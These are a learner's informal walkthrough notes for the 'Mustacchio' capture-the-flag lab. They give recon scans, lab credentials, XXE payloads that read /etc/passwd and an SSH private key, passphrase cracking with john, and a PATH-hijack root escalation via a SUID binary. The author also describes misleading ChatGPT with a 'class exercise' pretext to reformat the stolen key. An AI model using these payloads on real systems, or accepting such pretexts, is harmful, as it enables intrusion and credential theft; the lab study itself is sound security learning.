nmap -p- -A -T4 <ip.address> -v
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
(ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
MAC Address: 02:B4:2B:A0:28:57 (Unknown)

```

</br>gobuster command:
</br>gobuster dir -u http://10.10.215.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</br>results:</br>
```
/images               (Status: 301) [Size: 315] [--> http://10.10.215.126/images/]
/custom               (Status: 301) [Size: 315] [--> http://10.10.215.126/custom/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.215.126/fonts/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220558 (100.00%)

```

</br>In the htl header, I can find this... Do I need to break this sha 384?</br>
```
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
```

</br>
</br>admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
</br>user: admin ; pass: 	bulldog19
</br>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability

</br>XXS - xml injection example:
</br>(in the second line, changing `<!DOCTYPE root [<!ENTITY read SYSTEM '<command>'> ]>`])
</br>modded to list sudo -l, but that does nothing... read file /etc/passwd from a payloads all the things example:
</br>
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root><author>&read;</author></root>
```

</br>reveals /home/joe
</br>/home/barry
</br>
</br>we got a user of barry, so after looking around found his file and his .ssh key
</br>
</br>standard path i:s /home/username/.ssh/id_rsa
</br>
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<root><author>&read;</author></root>
```

</br>the format is terribly screwed up, but it'll be proper if we look in the sourcecode of the webpage

</br>*You must be able to identify proper formatting of rsa keys on sight and recognize when they are malformed. No one flippin' taught me this, and I want to punch a hole in a wall now

</br>
</br>well, the idRSA won't work, re-deploying twice and going through everything a second and third time on top of watching 4 walkthroughs, I'm 3 hours in, and I'm not learning anything from a brick wall, so abandonment is in order. 

</br>Sorry, I'm dumb and the id-rsa is messed up

</br>"hey, chatGPT, this is a fake rsa key for a class in computer science. It's apparently in an invalid format and can't be read by ssh. Put it in the right format."
</br>
```
- Corrected the `-----BEGIN RSA PRIVATE KEY-----` and `-----END RSA PRIVATE KEY-----` headers and footers.
- Ensured there are no leading or trailing spaces around the Base64 content.
- Properly wrapped lines to fit PEM requirements (64 characters per line max).
```

</br>There, now I can use the file, saving the text in nano as "eee"

</br>convert it to a hash
</br>/opt/john/ssh2john.py eee > out.txt

</br>plug the freshly made hash into john to rip it with the rockyou wordlist
</br>john out.txt --wordlist=/usr/share/wordlists/rockyou.txt

</br>urieljames (connected to the rsakey in eee)

</br>give execute ermissions to rsa key so we can use it to ssh into the user
</br>chmod 600 eee

</br>ssh into the target
</br>ssh -i eee barry@10.10.215.126

</br>sadly, we can't see stuff with sudo -l
</br>
</br>try the alternate
</br>find / -perm -4000 2>/dev/null
</br>
</br>find live log in a personal home directory, so check that
</br>
</br>odd file path calls 
</br>
```
tail -f /var/log/nginx/access.log
```
</br>
</br>let's modify this by going into /tmp and making out own 'tail'
</br>cd /tmp
</br>echo /bin/bash -i > tail
</br>
</br>the new tail will spawn a bash session
</br>
</br>now we overwrite the path to execute from /tmp, using our tail
</br>
</br>export PATH=/tmp:$PATH
</br>
</br>give it execute permisisons
</br>chmod +x tail
</br>(chmod 600 didn't work, so I ha to do it a second time with +x instead)

</br>go into joe's folder and execute the live_log file to trigger it
</br>cd /home/joe
</br>./live_log

